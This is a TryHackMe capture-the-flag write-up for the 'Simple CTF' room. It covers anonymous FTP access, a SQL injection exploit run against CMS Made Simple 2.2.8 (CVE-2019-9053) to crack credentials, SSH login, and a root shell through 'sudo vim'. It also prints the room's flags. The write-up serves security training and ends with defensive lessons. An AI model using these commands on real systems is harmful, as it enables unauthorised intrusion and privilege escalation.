# 🖥️ Simple CTF — TryHackMe

| Field | Details |
|---|---|
| 🏷️ Machine | Simple CTF |
| 🌐 Platform | TryHackMe |
| 🎯 Difficulty | Easy |
| 🧠 Topics | FTP Anonymous Login, CMS SQLi (CVE-2019-9053), SSH, sudo vim PrivEsc |
| 📅 Date | 21-10-2025 |
| 👤 Author | [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) |
| 🔗 Room | https://tryhackme.com/room/easyctf |

---

## 📌 Summary

Simple CTF is an easy TryHackMe machine. Anonymous FTP login reveals a note hinting at weak credentials for a user called `mitch`. Gobuster finds a CMS Made Simple v2.2.8 installation vulnerable to SQL injection (CVE-2019-9053). A Python exploit dumps and cracks the credentials, giving SSH access on port 2222. Privilege escalation is done via `sudo vim` using the GTFOBins technique.

---

## 🔍 1. Reconnaissance & Port Scan

```bash
nmap -sCV <TARGET_IP>
```

**Open Ports:**

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | vsftpd 3.0.3 — anonymous login allowed |
| 80 | HTTP | Apache 2.4.18 |
| 2222 | SSH | OpenSSH 7.2p2 |

> SSH runs on **port 2222**, not the default 22.
> `robots.txt` has 2 disallowed entries including `/openemr-5_0_1_3`

---

## 🔎 2. FTP Anonymous Login

```bash
ftp anonymous@<TARGET_IP>
```

Login successful. Navigate to the `pub` directory:

```bash
ftp> cd pub
ftp> ls -la
# ForMitch.txt
ftp> get ForMitch.txt
ftp> exit
```

Read the file:

```bash
cat ForMitch.txt
```

```
Dammit man... you're the worst dev i've seen. You set the same pass
for the system user, and the ssword is so weak... i cracked it in
seconds. Gosh... what a mess!
```

**Key finding:** System user `mitch` uses a very weak password.

---

## 🌐 3. Web Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -o gobuster.txt
```

**Finding:** `/simple` → redirects to `http://<TARGET_IP>/simple/`

Browsing to `/simple` reveals **CMS Made Simple version 2.2.8**:

```
© Copyright 2004 - 2025 - CMS Made Simple
This site is powered by CMS Made Simple version 2.2.8
```

Searching on [exploit-db.com](https://exploit-db.com) → found **CVE-2019-9053** — SQL Injection for CMS Made Simple < 2.2.10.

---

## 💥 4. Exploitation — CVE-2019-9053

Copy the exploit from ExploitDB into a new file:

```bash
nano newexploit.py
# paste the exploit script
```

Run it:

```bash
python3 newexploit.py -u http://<TARGET_IP>/simple -c -w /usr/share/wordlists/rockyou.txt
```

**Arguments:**
- `-u` — Target URL
- `-c` — Crack found hash
- `-w` — Wordlist (rockyou.txt)

**Output:**

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

✅ **Credentials:** `mitch : secret`

---

## 🔌 5. SSH Connection

```bash
ssh mitch@<TARGET_IP> -p 2222
# Password: secret
```

✅ **SSH login successful** — Ubuntu 16.04.6 LTS

### Read User Flag

```bash
ls
# user.txt
cat user.txt
# G00d j0b, keep up!
```

✅ **User flag captured**

### Check Other Users

```bash
cd ..
ls
# mitch  sunbath
```

Another user `sunbath` exists on the machine.

---

## ⬆️ 6. Privilege Escalation — sudo vim

```bash
sudo -l
```

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

`mitch` can run `vim` as root with no password. Using [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo):

```bash
sudo vim -c ':!/bin/sh'
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

✅ **Root shell obtained**

---

## 🚩 7. Root Flag

```bash
cd /root
ls
# root.txt
cat root.txt
# W3ll d0n3. You made it!
```

✅ **Root flag captured — Room complete!**

---

## 🏁 All Flags

| Flag | Value |
|---|---|
| 🏳️ User flag | `G00d j0b, keep up!` |
| 🚩 Root flag | `W3ll d0n3. You made it!` |

---

## 📚 8. Lessons Learned

- FTP anonymous login should always be disabled in production
- Notes left on FTP servers can leak usernames and hint at weak passwords
- Always check CMS version numbers in page footers — they allow instant exploit identification on ExploitDB
- CVE-2019-9053 is a time-based SQL injection that also cracks hashes with the `-c` flag
- `sudo vim` without a password is a critical misconfiguration — instantly exploitable via GTFOBins

---

## 🛠️ Tools Used

- `nmap` — port scanning
- `ftp` — anonymous login
- `gobuster` — directory enumeration
- ExploitDB CVE-2019-9053 Python script — SQL injection exploit
- `rockyou.txt` — password cracking wordlist
- `ssh` — remote access (port 2222)
- `GTFOBins` — sudo vim privilege escalation

---

*Writeup by [Sandeep Prasad Chowdhury](https://github.com/chowdhurysandeep) — for educational purposes only.*
